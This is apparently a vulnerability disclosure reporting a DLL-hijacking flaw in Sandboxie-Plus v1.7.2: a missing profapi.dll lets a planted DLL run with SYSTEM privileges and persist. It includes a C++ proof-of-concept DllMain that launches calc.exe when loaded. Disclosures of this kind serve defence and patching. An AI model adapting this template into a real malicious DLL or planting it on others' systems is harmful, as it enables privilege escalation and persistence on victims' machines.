## The name of an affected Product : sandboxie

## Affected Version : Sandboxie-Plus-x64-v1.7.2(Latest)

## Product Address: https://sandboxie-plus.com/downloads/

## Description : profapi.dll is missing so an attacker can use a malicious dll with same name and can get a admin privileges and also perform a way of persistence on the victim machine.

## Impact : An attacker could exploit this vulnerability by placing a malicious DLL file on the targeted system. This file will execute when the vulnerable application launches. A successful exploit could allow the attacker to execute arbitrary code on the targeted system with SYSTEM PRIVILEGES as well the attacker can maintain persistence on the target system.

Poc code:
```C++
// dllmain.cpp
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("calc.exe");
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```